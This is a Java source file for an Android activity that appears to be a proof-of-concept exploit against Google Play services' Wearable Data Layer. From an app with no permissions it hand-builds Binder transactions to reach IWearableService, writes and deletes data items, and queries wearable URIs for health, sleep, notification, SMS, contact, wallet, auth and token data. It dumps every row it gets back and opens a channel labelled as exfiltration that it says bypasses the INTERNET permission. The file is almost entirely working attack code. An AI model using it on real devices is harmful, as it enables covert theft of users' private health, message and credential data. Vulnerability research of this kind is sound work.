package com.poc.datalayer;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.database.CursorWindow;
import android.net.Uri;
import android.os.Binder;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcel;
import android.os.RemoteException;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.TextView;

import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

public class DataLayerHighImpact extends Activity {
    private static final String TAG = "DL_HIGH_IMPACT";
    private static final String BROKER_DESC = "com.google.android.gms.common.internal.IGmsServiceBroker";
    private static final String GMSCB_DESC = "com.google.android.gms.common.internal.IGmsCallbacks";
    private static final String IWS_DESC = "com.google.android.gms.wearable.internal.IWearableService";
    private static final String IWC_DESC = "com.google.android.gms.wearable.internal.IWearableCallbacks";

    private StringBuilder output = new StringBuilder();
    private TextView textView;
    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView scroll = new ScrollView(this);
        textView = new TextView(this);
        textView.setPadding(16, 16, 16, 16);
        textView.setTextSize(7);
        scroll.addView(textView);
        setContentView(scroll);

        log("=== Data Layer HIGH IMPACT Proof v6 ===");
        log("UID: " + android.os.Process.myUid());
        log("Pkg: " + getPackageName());
        log("Permissions: NONE");
        log("");

        Intent intent = new Intent("com.google.android.gms.wearable.BIND");
        intent.setPackage("com.google.android.gms");
        bindService(intent, new ServiceConnection() {
            public void onServiceConnected(ComponentName n, IBinder b) {
                log("[+] Bound to WearableService broker");
                updateUI();
                new Thread(() -> runHighImpactProof(b)).start();
            }
            public void onServiceDisconnected(ComponentName n) {}
        }, Context.BIND_AUTO_CREATE);
    }

    private void runHighImpactProof(IBinder broker) {
        IBinder ws = getWearableService(broker);
        if (ws == null) {
            log("[FAIL] Could not get IWearableService");
            updateUI();
            return;
        }
        log("[+] Got IWearableService binder (zero permissions!)");
        log("");

        log("========================================");
        log("PHASE 0: WRITE → READ → DELETE CYCLE");
        log("========================================");
        updateUI();
        testWriteReadDelete(ws);

        log("");
        log("========================================");
        log("PHASE 1: READ ALL DATA ITEMS (code 8)");
        log("========================================");
        updateUI();
        readAllDataItems(ws);

        log("");
        log("========================================");
        log("PHASE 2: URI QUERY wear://*/ (code 9)");
        log("========================================");
        updateUI();
        queryByUri(ws, "wear://*/", 1);

        log("");
        log("========================================");
        log("PHASE 3: HEALTH DATA QUERY");
        log("========================================");
        updateUI();
        queryByUri(ws, "wear://*/health", 1);
        queryByUri(ws, "wear://*/fit", 1);
        queryByUri(ws, "wear://*/sensor", 1);
        queryByUri(ws, "wear://*/heart", 1);
        queryByUri(ws, "wear://*/step", 1);
        queryByUri(ws, "wear://*/sleep", 1);
        queryByUri(ws, "wear://*/workout", 1);

        log("");
        log("========================================");
        log("PHASE 4: NOTIFICATION / MESSAGES QUERY");
        log("========================================");
        updateUI();
        queryByUri(ws, "wear://*/notification", 1);
        queryByUri(ws, "wear://*/message", 1);
        queryByUri(ws, "wear://*/sms", 1);
        queryByUri(ws, "wear://*/call", 1);
        queryByUri(ws, "wear://*/contact", 1);

        log("");
        log("========================================");
        log("PHASE 5: GOOGLE APPS DATA QUERY");
        log("========================================");
        updateUI();
        queryByUri(ws, "wear://*/google", 1);
        queryByUri(ws, "wear://*/gms", 1);
        queryByUri(ws, "wear://*/assistant", 1);
        queryByUri(ws, "wear://*/wallet", 1);
        queryByUri(ws, "wear://*/auth", 1);
        queryByUri(ws, "wear://*/token", 1);
        queryByUri(ws, "wear://*/config", 1);
        queryByUri(ws, "wear://*/common", 1);

        log("");
        log("========================================");
        log("PHASE 6: CHANNEL EXFILTRATION PROOF");
        log("========================================");
        log("A zero-perm app can open a channel to the phone,");
        log("bypassing INTERNET permission requirement.");
        updateUI();
        testChannelExfil(ws);

        log("");
        log("=== HIGH IMPACT PROOF COMPLETE ===");
        updateUI();
    }

    private void testWriteReadDelete(IBinder ws) {
        String testPath = "/poc/zero_perm_write_proof";
        String testData = "WRITTEN_BY_ZERO_PERM_APP_" + System.currentTimeMillis();
        String localNodeId = getLocalNodeId(ws);
        if (localNodeId == null) {
            log("[!] Could not get local node ID");
            return;
        }
        String testUri = "wear://" + localNodeId + testPath;
        log("[*] Writing data item: " + testUri);
        log("[*] Data: " + testData);

        CountDownLatch writeLatch = new CountDownLatch(1);
        IBinder writeCb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                log("[CB:putData] code=" + code + " size=" + data.dataSize());
                try {
                    data.enforceInterface(IWC_DESC);
                    parseDataHolder(data, "WRITE_RESULT");
                } catch (Exception e) {
                    log("[CB:putData] err: " + e.getMessage());
                }
                writeLatch.countDown();
                if (reply != null) reply.writeNoException();
                updateUI();
                return true;
            }
        };

        callWearable(ws, 6, (p) -> {
            p.writeStrongBinder(writeCb);
            p.writeInt(1);
            writePutDataRequest(p, testUri, testData.getBytes());
        });
        try { writeLatch.await(5, TimeUnit.SECONDS); } catch (Exception e) {}

        log("");
        log("[*] Now reading back ALL data items...");
        updateUI();
        CountDownLatch readLatch = new CountDownLatch(1);
        IBinder readCb = makeDataHolderCallback("READ_AFTER_WRITE", readLatch);
        callWearable(ws, 8, (p) -> p.writeStrongBinder(readCb));
        try { readLatch.await(5, TimeUnit.SECONDS); } catch (Exception e) {}

        log("");
        log("[*] Deleting test data item...");
        updateUI();
        CountDownLatch delLatch = new CountDownLatch(1);
        IBinder delCb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                try {
                    data.enforceInterface(IWC_DESC);
                    int marker = data.readInt();
                    if (marker != 0) {
                        int h = data.readInt();
                        int sz = ((h >> 16) & 0xFFFF) == 0xFFFF ? data.readInt() : (h >> 16) & 0xFFFF;
                        int end = data.dataPosition() + sz;
                        while (data.dataPosition() < end) {
                            int fh = data.readInt();
                            int fid = fh & 0xFFFF;
                            int fsz = (fh >> 16) & 0xFFFF;
                            if (fsz == 0xFFFF) fsz = data.readInt();
                            int fend = data.dataPosition() + fsz;
                            if (fid == 2 && fsz == 4) {
                                log("[+] Delete status: " + data.readInt());
                            }
                            data.setDataPosition(Math.min(fend, data.dataSize()));
                        }
                    }
                } catch (Exception e) {}
                delLatch.countDown();
                if (reply != null) reply.writeNoException();
                updateUI();
                return true;
            }
        };

        callWearable(ws, 11, (p) -> {
            p.writeStrongBinder(delCb);
            Uri uri = Uri.parse(testUri);
            p.writeInt(1);
            uri.writeToParcel(p, 0);
            p.writeInt(0);
        });
        try { delLatch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void writePutDataRequest(Parcel p, String uriStr, byte[] data) {
        int objPos = spBeginObject(p);
        int uriFieldPos = spBeginVar(p, 2);
        Uri.parse(uriStr).writeToParcel(p, 0);
        spEndVar(p, uriFieldPos);
        int bundleFieldPos = spBeginVar(p, 4);
        new Bundle().writeToParcel(p, 0);
        spEndVar(p, bundleFieldPos);
        int dataFieldPos = spBeginVar(p, 5);
        p.writeByteArray(data);
        spEndVar(p, dataFieldPos);
        p.writeInt(6 | (8 << 16));
        p.writeLong(1800000L);
        spFinishObject(p, objPos);
    }

    private String getLocalNodeId(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        final String[] nodeId = {null};
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 9) {
                    try {
                        data.enforceInterface(IWC_DESC);
                        int marker = data.readInt();
                        if (marker != 0) {
                            int objH = data.readInt();
                            int objSz = ((objH >> 16) & 0xFFFF) == 0xFFFF ? data.readInt() : (objH >> 16) & 0xFFFF;
                            int objEnd = data.dataPosition() + objSz;
                            while (data.dataPosition() < objEnd) {
                                int fh = data.readInt();
                                int fid = fh & 0xFFFF;
                                int fsz = (fh >> 16) & 0xFFFF;
                                if (fsz == 0xFFFF) fsz = data.readInt();
                                int fend = data.dataPosition() + fsz;
                                if (fid == 3) {
                                    int npH = data.readInt();
                                    int npSz = ((npH >> 16) & 0xFFFF) == 0xFFFF ? data.readInt() : (npH >> 16) & 0xFFFF;
                                    int npEnd = data.dataPosition() + npSz;
                                    while (data.dataPosition() < npEnd) {
                                        int nfh = data.readInt();
                                        int nfid = nfh & 0xFFFF;
                                        int nfsz = (nfh >> 16) & 0xFFFF;
                                        if (nfsz == 0xFFFF) nfsz = data.readInt();
                                        int nfend = data.dataPosition() + nfsz;
                                        if (nfid == 2) {
                                            nodeId[0] = data.readString();
                                        }
                                        data.setDataPosition(Math.min(nfend, data.dataSize()));
                                    }
                                }
                                data.setDataPosition(Math.min(fend, data.dataSize()));
                            }
                        }
                    } catch (Exception e) {}
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                return true;
            }
        };
        callWearable(ws, 14, (p) -> p.writeStrongBinder(cb));
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
        if (nodeId[0] != null) log("[+] Local node: " + nodeId[0]);
        return nodeId[0];
    }

    private void readAllDataItems(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = makeDataHolderCallback("ALL_ITEMS", latch);
        callWearable(ws, 8, (p) -> p.writeStrongBinder(cb));
        try { latch.await(5, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void queryByUri(IBinder ws, String uriStr, int filterType) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = makeDataHolderCallback("URI[" + uriStr + "]", latch);

        callWearable(ws, 9, (p) -> {
            p.writeStrongBinder(cb);
            Uri uri = Uri.parse(uriStr);
            p.writeInt(1);
            uri.writeToParcel(p, 0);
            p.writeInt(filterType);
        });
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void testChannelExfil(IBinder ws) {
        CountDownLatch latch = new CountDownLatch(1);
        IBinder cb = new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code == 14) {
                    try {
                        data.enforceInterface(IWC_DESC);
                        int marker = data.readInt();
                        if (marker != 0) {
                            parseChannelResponse(data);
                        }
                    } catch (Exception e) {
                        log("[*] Channel parse: " + e.getMessage());
                    }
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                updateUI();
                return true;
            }
        };

        callWearable(ws, 31, (p) -> {
            p.writeStrongBinder(cb);
            p.writeString("96eb2ede");
            p.writeString("/poc/exfil_channel");
        });
        try { latch.await(3, TimeUnit.SECONDS); } catch (Exception e) {}
    }

    private void parseChannelResponse(Parcel p) {
        int objHeader = p.readInt();
        int objSize = ((objHeader >> 16) & 0xFFFF) == 0xFFFF ? p.readInt() : (objHeader >> 16) & 0xFFFF;
        int objEnd = p.dataPosition() + objSize;
        while (p.dataPosition() < objEnd && p.dataPosition() < p.dataSize()) {
            int fh = p.readInt();
            int fid = fh & 0xFFFF;
            int fsz = (fh >> 16) & 0xFFFF;
            if (fsz == 0xFFFF) fsz = p.readInt();
            int fend = p.dataPosition() + fsz;
            if (fid == 2 && fsz == 4) {
                int status = p.readInt();
                log("[+] Channel status: " + status);
                if (status == 0) {
                    log("[!!!] CHANNEL OPENED - zero-perm app has network path to phone!");
                    log("[!!!] This bypasses INTERNET permission entirely.");
                }
            } else if (fid == 3) {
                String token = readSafeString(p, fend);
                if (token != null) log("[+] Channel token: " + trunc(token, 40));
            }
            p.setDataPosition(Math.min(fend, p.dataSize()));
        }
    }

    private IBinder makeDataHolderCallback(String label, CountDownLatch latch) {
        return new Binder() {
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                try {
                    data.enforceInterface(IWC_DESC);
                    parseDataHolder(data, label);
                } catch (Exception e) {
                    log("[!] " + label + " callback error: " + e.getClass().getSimpleName()
                        + ": " + trunc(e.getMessage(), 80));
                }
                latch.countDown();
                if (reply != null) reply.writeNoException();
                updateUI();
                return true;
            }
        };
    }

    private void parseDataHolder(Parcel p, String label) {
        int marker = p.readInt();
        if (marker == 0) {
            log("[*] " + label + ": null DataHolder");
            return;
        }

        int objHeader = p.readInt();
        int objSize;
        if (((objHeader >> 16) & 0xFFFF) == 0xFFFF) {
            objSize = p.readInt();
        } else {
            objSize = (objHeader >> 16) & 0xFFFF;
        }
        int objEnd = p.dataPosition() + objSize;

        String[] columns = null;
        CursorWindow[] windows = null;
        int status = -1;
        int version = -1;
        Bundle metadata = null;

        while (p.dataPosition() < objEnd && p.dataPosition() < p.dataSize()) {
            int fHeader = p.readInt();
            int fId = fHeader & 0xFFFF;
            int fSz = (fHeader >> 16) & 0xFFFF;
            if (fSz == 0xFFFF) {
                fSz = p.readInt();
            }
            int fEnd = p.dataPosition() + fSz;

            try {
                switch (fId) {
                    case 1:
                        columns = p.createStringArray();
                        break;
                    case 2:
                        windows = p.createTypedArray(CursorWindow.CREATOR);
                        break;
                    case 3:
                        status = p.readInt();
                        break;
                    case 4:
                        metadata = p.readBundle();
                        break;
                    case 1000:
                        version = p.readInt();
                        break;
                }
            } catch (Exception e) {
                log("[*] " + label + " field " + fId + " error: " + e.getMessage());
            }
            p.setDataPosition(Math.min(fEnd, p.dataSize()));
        }

        log("[+] " + label + " => status=" + status + " version=" + version);

        if (columns != null && columns.length > 0) {
            StringBuilder colStr = new StringBuilder();
            for (int i = 0; i < columns.length; i++) {
                if (i > 0) colStr.append(", ");
                colStr.append("[").append(i).append("]=").append(columns[i]);
            }
            log("[+] Columns: " + colStr);
        }

        if (metadata != null) {
            for (String key : metadata.keySet()) {
                log("[+] Metadata: " + key + " = " + metadata.get(key));
            }
        }

        if (windows == null || windows.length == 0) {
            log("[*] " + label + ": no CursorWindows (0 rows)");
            return;
        }

        int totalRows = 0;
        for (int w = 0; w < windows.length; w++) {
            CursorWindow win = windows[w];
            if (win == null) continue;
            int numRows = win.getNumRows();
            int numCols = (columns != null) ? columns.length : 0;
            totalRows += numRows;
            log("[+] Window[" + w + "]: " + numRows + " rows x " + numCols + " cols");

            for (int row = 0; row < numRows && row < 50; row++) {
                log("--- Row " + row + " ---");
                for (int col = 0; col < numCols; col++) {
                    String colName = (columns != null && col < columns.length) ? columns[col] : "col" + col;
                    String val;
                    try {
                        int type = win.getType(row, col);
                        switch (type) {
                            case 0: val = "NULL"; break;
                            case 1: val = "INT:" + win.getLong(row, col); break;
                            case 2: val = "FLOAT:" + win.getDouble(row, col); break;
                            case 3:
                                val = win.getString(row, col);
                                if (val != null && val.length() > 200) val = val.substring(0, 200) + "...";
                                break;
                            case 4:
                                byte[] blob = win.getBlob(row, col);
                                val = "BLOB(" + blob.length + "b)";
                                if (blob.length > 0 && blob.length <= 500) {
                                    String ascii = tryReadableAscii(blob);
                                    if (ascii.length() > 5) val += " ascii=\"" + ascii + "\"";
                                    val += " hex=" + hexDump(blob, 64);
                                }
                                break;
                            default: val = "TYPE_" + type; break;
                        }
                    } catch (Exception e) {
                        val = "ERR:" + e.getMessage();
                    }
                    log("[!!!] " + colName + " = " + val);
                }
            }

            if (numRows > 50) {
                log("[*] ... truncated " + (numRows - 50) + " more rows");
            }

            try { win.close(); } catch (Exception e) {}
        }

        if (totalRows > 0) {
            log("[!!!] " + label + ": EXTRACTED " + totalRows + " DATA ITEMS WITH ZERO PERMISSIONS!");
        } else {
            log("[*] " + label + ": 0 rows returned");
        }
    }

    private String tryReadableAscii(byte[] data) {
        StringBuilder sb = new StringBuilder();
        for (byte b : data) {
            if (b >= 32 && b < 127) {
                sb.append((char) b);
            } else if (sb.length() > 0) {
                sb.append('.');
            }
        }
        return sb.toString();
    }

    private String hexDump(byte[] data, int maxBytes) {
        StringBuilder sb = new StringBuilder();
        int len = Math.min(data.length, maxBytes);
        for (int i = 0; i < len; i++) {
            sb.append(String.format("%02x", data[i]));
            if (i % 4 == 3) sb.append(" ");
        }
        if (data.length > maxBytes) sb.append("...");
        return sb.toString();
    }

    private String readSafeString(Parcel p, int limit) {
        try {
            if (p.dataPosition() < limit) return p.readString();
        } catch (Exception e) {}
        return null;
    }

    private interface ParcelWriter { void write(Parcel p); }

    private void callWearable(IBinder ws, int code, ParcelWriter writer) {
        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(IWS_DESC);
            writer.write(data);
            boolean r = ws.transact(code, data, reply, 0);
            if (r) {
                try {
                    reply.readException();
                    log("[+] Code " + code + ": OK");
                } catch (Exception e) {
                    log("[BLOCKED] Code " + code + ": " + trunc(e.getMessage(), 60));
                }
            }
        } catch (SecurityException e) {
            log("[BLOCKED] Code " + code + ": " + trunc(e.getMessage(), 60));
        } catch (Exception e) {
            log("[!] Code " + code + ": " + e.getClass().getSimpleName());
        } finally {
            data.recycle();
            reply.recycle();
        }
        updateUI();
    }

    private IBinder getWearableService(IBinder broker) {
        CountDownLatch latch = new CountDownLatch(1);
        final IBinder[] result = {null};

        IBinder cb = new Binder() {
            @Override
            public String getInterfaceDescriptor() { return GMSCB_DESC; }
            @Override
            protected boolean onTransact(int code, Parcel data, Parcel reply, int flags)
                    throws RemoteException {
                if (code >= 1 && code <= 5) {
                    try { data.enforceInterface(GMSCB_DESC); } catch (Exception e) { data.setDataPosition(0); }
                    int s = data.readInt();
                    IBinder b = data.readStrongBinder();
                    if (s == 0 && b != null) result[0] = b;
                    latch.countDown();
                    if (reply != null) reply.writeNoException();
                    return true;
                }
                return super.onTransact(code, data, reply, flags);
            }
        };

        Parcel data = Parcel.obtain();
        Parcel reply = Parcel.obtain();
        try {
            data.writeInterfaceToken(BROKER_DESC);
            data.writeStrongBinder(cb);
            data.writeInt(1);
            int h = spBeginObject(data);
            spWriteInt(data, 1, 6);
            spWriteInt(data, 2, 14);
            spWriteInt(data, 3, 263332086);
            spWriteString(data, 4, getPackageName());
            spWriteBoolean(data, 12, true);
            spFinishObject(data, h);
            broker.transact(46, data, reply, 0);
        } catch (Exception e) {
            log("[!] getService: " + e.getMessage());
        } finally {
            data.recycle();
            reply.recycle();
        }
        try { latch.await(5, TimeUnit.SECONDS); } catch (Exception e) {}
        return result[0];
    }

    private int spBeginObject(Parcel p) { return spBeginVar(p, 20293); }
    private void spFinishObject(Parcel p, int pos) { spEndVar(p, pos); }
    private void spWriteInt(Parcel p, int fid, int val) { p.writeInt(fid | (4 << 16)); p.writeInt(val); }
    private void spWriteBoolean(Parcel p, int fid, boolean val) { p.writeInt(fid | (4 << 16)); p.writeInt(val ? 1 : 0); }
    private void spWriteString(Parcel p, int fid, String val) {
        if (val == null) return;
        int pos = spBeginVar(p, fid); p.writeString(val); spEndVar(p, pos);
    }
    private int spBeginVar(Parcel p, int fid) { p.writeInt(fid | 0xFFFF0000); p.writeInt(0); return p.dataPosition(); }
    private void spEndVar(Parcel p, int s) { int e = p.dataPosition(); p.setDataPosition(s - 4); p.writeInt(e - s); p.setDataPosition(e); }

    private String trunc(String s, int len) {
        if (s == null) return "null";
        return s.length() > len ? s.substring(0, len) + "..." : s;
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        output.append(msg).append("\n");
    }

    private void updateUI() {
        handler.post(() -> { if (textView != null) textView.setText(output.toString()); });
    }
}
